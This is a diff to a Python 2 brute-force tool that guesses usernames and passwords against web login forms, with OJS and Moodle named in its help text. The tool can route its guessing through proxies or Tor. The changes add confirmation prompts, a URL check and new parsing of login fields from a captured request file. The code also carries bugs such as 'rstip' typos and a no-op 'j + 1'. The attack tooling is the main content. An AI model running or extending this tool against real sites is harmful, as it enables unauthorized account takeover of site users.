@@ -8,7 +8,7 @@ import socket # Tor
 import socks # Tor
 import random
 
-def checkFile(reqFile,user,pwd,message,verbose,cookie,agent,proxip,proxport,tor,report):
+def checkFile(reqFile,user,pwd,message,verbose,cookie,agent,proxip,proxport,tor,report,valUrl):
 	
 	b = ['','1','12']
 	a = []
@@ -16,6 +16,24 @@ def checkFile(reqFile,user,pwd,message,verbose,cookie,agent,proxip,proxport,tor,
 	proxies = {'http' : proxy, 'https' : proxy,}
 	
 	print colored("\nBeginning BruteForce with Request File", 'cyan')
+	warning = raw_input('Please check that the arguments you gave to the tool are correct, Do you continue? [Y/n]') or 'Y'
+	if 'Y' in warning or 'y' in warning:
+		pass
+	else:
+		error = """
+Advices to check the arguments:
+ * Error message: To check the correct error message showed by the site, you could try the following after one login:
+  - OJS: 
+	1.- Add at the beginning of the URL the tag "view-source" (without the quotes).
+	2.- Look for the form named "pkp_form_error" and inside the element, it would be the error message
+
+  - Moodle:
+	1.- Add at the beginning of the URL the tag "view-source" (without the quotes).
+	2.- Look for any of these tags: "loginerror" or "loginerrormessage" and next to them it should be the error message
+"""
+		print colored(error,'green')
+		sys.exit(2)
+	
 	if os.path.exists(reqFile):
 		fo = open(reqFile,'r')
 		for line in fo:
@@ -24,16 +42,47 @@ def checkFile(reqFile,user,pwd,message,verbose,cookie,agent,proxip,proxport,tor,
 			try:
 				if match.group():
 					url = match.group(1)
-			except:		
-				regex = re.compile(r'(.*=&)(.*)(=(.*)\&)(.*)(\=)(.*)') # Obtiene los campos del login
-				match = regex.search(line)
-				try:
-					if match.group():
-						userField = match.group(2)
-						passField = match.group(5)
-				except:
-					continue
+			except:
+				pass
+			if '&' in line:
+				val = re.split(r'[&=]',line)
+				userField = val[0]
+				passField = val[2]
 		fo.close()
+	else:
+		print colored('The file doesn\'t exists', 'green')
+		sys.exit(2)
+	
+	if valUrl in url:
+		pass
+	else:
+		print colored('The url: ','yellow') + colored(valUrl,'blue') + colored(' doesn\'t match with: ','yellow') + colored(url,'blue')
+		
+		sys.exit(2)
+	
+	
+	print colored('Username field is: ','yellow') + colored(userField,'blue') + colored(' Password field is: ','yellow') + colored(passField,'blue')
+	ask = raw_input('Are those values correct and Can we continue? [Y/n]') or 'Y'
+	if 'Y' in ask or 'y' in ask:
+		pass
+	else:
+		error = """
+Advices to get the correct values in the file:
+	* The tool takes only two values in the file, e.g.:
+	
+1.- If the fields are 'username' and 'password' and the sentence is: anchor=&username=jaja&password=nds
+		Please modify the file like this: username=jaja&password=nds
+	
+2.- If the fields are 'username' and 'password' and the sentence is: csrfToken=e71f33efe15de9fdcee2631e003f0ea3&source=&username=asd&password=asd&remember=1
+		Please modify like this: username=asd&password=asd&remember=1
+ 
+"""
+		print colored(error,'green')
+		sys.exit(2)
+		
+		print colored()
+		sys.exit(2)
+		
 	
 	requests.packages.urllib3.disable_warnings()
 	if len(proxy) == 1:
@@ -628,7 +677,8 @@ def doubleFile(url, userField, passField, user, pwd, message,verbose,cookies,hea
 							l.append('Attack not successfully with: ' + 'User: ' + users[i].rstip('\n') + ' Password: ' + passwords[j].rstrip('\n'))
 						elif int(verbose) == 3:
 							print colored('Attack not successfully with: ', 'red') + 'User: ' + colored(users[i].rstrip('\n'),'yellow') + ' Password: ' + colored(passwords[j].rstrip('\n'),'yellow')
-							l.append('Attack not successfully with: ' + 'User: ' + users[i].rstip('\n') + ' Password: ' + passwords[j].rstrip('\n'))
+							#l.append('Attack not successfully with: ' + 'User: ' + users[i].rstip('\n') + ' Password: ' + passwords[j].rstrip('\n'))
+							l.append('Attack not successfully with: ' + 'User: ' + users[i] + ' Password: ' + passwords[j])
 						
 						j + 1
 					else:
